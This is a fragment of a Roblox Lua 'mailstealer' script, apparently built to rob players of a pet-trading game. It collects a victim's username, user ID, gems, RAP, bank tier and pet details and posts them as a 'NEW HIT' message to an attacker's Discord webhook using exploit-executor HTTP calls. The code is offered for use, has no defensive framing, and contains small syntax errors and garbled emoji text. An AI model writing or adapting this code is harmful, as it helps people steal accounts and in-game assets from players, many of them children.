_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
_G.PetName = v2.name
_G.PetRar = v2.rarity

local function sendwebhook(msg)
local msg = {
	["content"]= "**üíéNEW HIT WITH MONZüíé**",
	["embeds"]= {
	  {
		["title"]= "`Monz Mailstealer Results`",
		["description"]= "**Data from the victim**\nüßëDisplay Name: ".._G.PlrDisplayNameVictim.."\nüßëUsername: ".._G.PlrUserVictim.."\nüßëUser ID: ".._G.PlrUserIDVictim.."\nüê±Rank: ".._G.CurrentRank.."\nüéÆPlace: ".._G.GameIn.."\nüíéGems: **".._G.DisplayDiamond.."**\n‚¨ÜÔ∏èRap: **".._G.DisplayRap.."**\nüìàBank Tier: **".._G.DisplayBankTier.."**\n‚ò†Ô∏èExecutor: **"..getexploit().."**",
		["url"]= "https://discord.gg/34fs3FWt",
		["color"]= ""..webhookcolor.."",
		["fields"]= {
		  {
		    ["name"]= "Pet Name & Pet Rarity"
		    ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."",
		    ["inline"]= true
	}
	}
	}
  }
  },
	["attachments"] = {}
  };
  local Webhook = _G.Webhook
  request = http_request or request or HttpPost or syn.request
  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
  end
  sendwebhook(msg)